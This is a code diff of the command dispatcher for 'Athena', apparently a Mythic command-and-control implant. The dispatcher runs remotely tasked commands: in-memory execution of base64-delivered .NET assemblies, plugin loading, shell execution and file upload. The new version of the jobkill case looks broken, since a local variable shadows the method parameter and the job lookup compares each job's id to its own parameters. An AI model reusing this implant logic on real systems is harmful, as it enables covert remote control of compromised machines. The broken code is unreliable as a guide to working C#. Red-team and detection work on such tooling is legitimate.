@@ -1,9 +1,9 @@
-﻿using Athena.Mythic.Model;
-using System;
-using System.Collections.Generic;
-using Athena.Commands.Model;
+﻿using Athena.Commands.Model;
+using Athena.Mythic.Model;
 using Athena.Utilities;
 using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Linq;
@@ -13,10 +13,10 @@ namespace Athena.Commands
 
     public class CommandHandler
     {
-        public static void StartJob(MythicJob task)
+        public static void StartJob(MythicJob job)
         {
-            MythicJob job = Globals.jobs[task.task.id];
-            job.started = true;
+            //MythicJob job = Globals.jobs[task.task.id];
+            //job.started = true;
             switch (job.task.command)
             {
                 case "builtin":
@@ -45,6 +45,7 @@ namespace Athena.Commands
                     {
                         var t = Task.Run(() =>
                         {
+                            job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                             Globals.executeAssemblyTask = job.task.id;
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                             job.taskresult = "";
@@ -56,32 +57,32 @@ namespace Athena.Commands
                                     consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                                     //Set output for our ConsoleWriter
                                     Console.SetOut(consoleWriter);
-
                                     //Start a new thread for our blocking Execute-Assembly
                                     Globals.executeAseemblyThread = new Thread(() =>
                                     {
                                         try
                                         {
                                             job.hasoutput = true;
-                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
+                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
                                             //Assembly finished executing.
                                             Globals.executeAssemblyTask = "";
-                                            job.hasoutput = true;
                                             job.complete = true;
                                             Console.SetOut(origStdout);
+                                            return;
                                         }
-                                        catch (ThreadInterruptedException e)
+                                        catch (ThreadInterruptedException)
                                         {
                                             //Cancellation was requested, clean up.
                                             Globals.executeAssemblyTask = "";
                                             job.hasoutput = true;
                                             job.complete = true;
                                             job.errored = true;
-                                            Console.SetOut(origStdout);
+                                            Console.SetOut(origStdout); 
                                             Globals.alc.Unload();
-                                            Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
+                                            Globals.alc = new ExecuteAssemblyContext();
+                                            return;
                                         }
-                                        catch(ThreadAbortException e)
+                                        catch(ThreadAbortException)
                                         {
                                             Globals.executeAssemblyTask = "";
                                             job.hasoutput = true;
@@ -89,13 +90,13 @@ namespace Athena.Commands
                                             job.errored = true;
                                             Console.SetOut(origStdout);
                                             Globals.alc.Unload();
-                                            Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
+                                            Globals.alc = new ExecuteAssemblyContext();
+                                            return;
                                         }
-
-                                        return;
                                     });
                                     
                                     Globals.executeAseemblyThread.IsBackground = true;
+                                    
                                     //Start our assembly.
                                     Globals.executeAseemblyThread.Start();
                                 }
@@ -120,7 +121,6 @@ namespace Athena.Commands
                                 }
                             }
                         }, job.cancellationtokensource.Token);
-                        job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                     }
                     break;
                 case "exit":
@@ -145,38 +145,39 @@ namespace Athena.Commands
                                 output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                             }
                         }
-                        task.hasoutput = true;
-                        task.complete = true;
-                        task.taskresult = output;
+                        job.hasoutput = true;
+                        job.complete = true;
+                        job.taskresult = output;
                     });
                     break;
                 case "jobkill":
                     Task.Run(() =>
                     {
-                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == task.task.parameters).Value;
+                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
                         if (job != null)
                         {
                             //Attempt the cancel.
                             job.cancellationtokensource.Cancel();
+                            Globals.executeAseemblyThread.Interrupt();
 
                             //Wait to see if the cancel took.
-                            for (int i = 0; i != 30; i++)
+                            for (int i = 0; i != 31; i++)
                             {
                                 //Job exited successfully
                                 if (job.complete)
                                 {
-                                    task.taskresult = $"Task {task.task.parameters} exited successfully.";
-                                    task.complete = true;
-                                    task.hasoutput = true;
+                                    job.taskresult = $"Task {job.task.parameters} exited successfully.";
+                                    job.complete = true;
+                                    job.hasoutput = true;
                                     break;
                                 }
                                 //Job may have failed to cancel
                                 if (i == 30 && !job.complete)
                                 {
-                                    task.taskresult = $"Unable to cancel Task: {task.task.parameters}. Request timed out.";
-                                    task.complete = true;
-                                    task.hasoutput = true;
-                                    task.errored = true;
+                                    job.taskresult = $"Unable to cancel Task: {job.task.parameters}. Request timed out.";
+                                    job.complete = true;
+                                    job.hasoutput = true;
+                                    job.errored = true;
                                 }
                                 //30s timeout
                                 Thread.Sleep(1000);
@@ -184,9 +185,9 @@ namespace Athena.Commands
                         }
                         else
                         {
-                            task.taskresult = $"Task {task.task.parameters} not found!";
-                            task.complete = true;
-                            task.hasoutput = true;
+                            job.taskresult = $"Task {job.task.parameters} not found!";
+                            job.complete = true;
+                            job.hasoutput = true;
                         }
                     });
                     break;
@@ -198,17 +199,18 @@ namespace Athena.Commands
                     break;
                 //Can these all be merged into one and handled on the server-side?
                 case "load-assembly":
-                    LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                    job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
-                    break;
-                case "load-command":
-                    LoadAssembly loadcommand = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcommand.assembly),"test");
-                    break;
-                //Maybe get rid of this?
-                case "load-coresploit":
-                    LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
+                    try
+                    {
+                        LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
+                        job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
+                    }
+                    catch(Exception e)
+                    {
+                        job.taskresult = e.Message;
+                        job.errored = true;
+                    }
+                    job.hasoutput = true;
+                    job.complete = true;
                     break;
                 case "reset-assembly-context":
                     job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
@@ -216,9 +218,7 @@ namespace Athena.Commands
                     job.hasoutput = true;
                     break;
                 case "shell":
-                    job.taskresult = Execution.ShellExec(job.task);
-                    job.complete = true;
-                    job.hasoutput = true;
+                    Execution.ShellExec(job);
                     break;
                 case "sleep":
                     var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
@@ -279,6 +279,7 @@ namespace Athena.Commands
                     }
                     break;
                 case "upload":
+                    //This doesn't task from mythic for some reason
                     var uploadTask = Task.Run(() =>
                     {
                         try
@@ -325,19 +326,18 @@ namespace Athena.Commands
             if (Globals.loadedcommands.ContainsKey(job.task.command))
             {
                 job.taskresult =  AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
+                job.complete = true;
+                job.hasoutput = true;
+                if (job.taskresult.StartsWith("[ERROR]"))
+                {
+                    job.errored = true;
+                    job.taskresult = job.taskresult.Replace("[ERROR]", "");
+                }
             }
             else
             {
                 job.errored = true;
                 job.taskresult = "Plugin not loaded. Please use the load command to load the plugin!";
-            }
-            
-            job.complete = true;
-            job.hasoutput = true;
-            if (job.taskresult.StartsWith("[ERROR]"))
-            {
-                job.errored = true;
-                job.taskresult = job.taskresult.Replace("[ERROR]", "");
             }
         }
     }
